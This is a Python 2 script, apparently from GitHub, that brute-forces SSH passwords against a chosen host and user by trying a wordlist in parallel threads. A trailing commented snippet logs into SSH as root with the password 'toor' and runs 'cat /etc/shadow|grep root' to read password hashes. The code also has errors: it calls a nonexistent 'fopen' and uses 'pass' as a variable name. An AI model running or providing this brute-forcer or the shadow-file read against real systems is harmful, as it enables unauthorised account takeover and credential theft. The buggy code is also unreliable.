from optparse import OptionParser
from threading import *
import time
from pexpect import pxssh

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, passwd, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, passwd)
        Found = True
        print '[+] Found password ' + passwd
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, passwd, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, passwd, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = OptionParser("usage%prog -h <target Host> -u <user> -f <password file>")
    parser.add_option('-h', dest='tgtHost', type='string', help='specify the target host')
    parser.add_option('-u', dest='tgtUser', type='string', help='specify the target user')
    parser.add_option('-f', dest='tgtFile', type='string', help='specify the password file')
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    tgtUser = options.tgtUser
    tgtFile = options.tgtFile
    if tgtHost == None or tgtUser == None or tgtFile == None:
        parser.usage
        exit(0)
    
    passwdFile = fopen(tgtFile, 'r')
    for line in passwdFile.readlines():
        if Found:
            print "[+] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[*] Exiting: Too many sockets timeout"
            exit(0)
        connection_lock.acquire()
        passwd = line.strip('\r').strip('\n')
        print "[-] Testing password " + str(passwd)
        t = Thread( target=connect, args=(tgtHost, tgtUser, passwd, True) )
        child = t.start()

if __name__ == "__main__":
    main()
    
'''
ssh自动登录：

import pexpect

PROMPT = ['# ', '$ ', '>>> ', '> ', '\$ ']

def send_command(child, cmd):
	child.sendline(cmd)
	child.expect(PROMPT)
	print child.before

def connect(host, user, pass):
	ssh_newkey = 'Are you sure you want to continue connecting'
	child = pexpect.spawn('ssh '+user+'@'+host)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword'])
	if ret == 0:
		print '[-] Error Connecting'
		exit(1)
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword'])
		if ret == 0:
			print '[-] Error Connecting'
			exit(1)
		child.sendline(pass)
		child.expect(PROMPT)
		return child

def main():
	host = 'localhost'
	user = 'root'
	pass = 'toor'
	child = connect(host, user, pass)
	send_command(child, 'cat /etc/shadow|grep root')

if __name__ == '__main__':
	main()
© 2020 GitHub, Inc.
'''
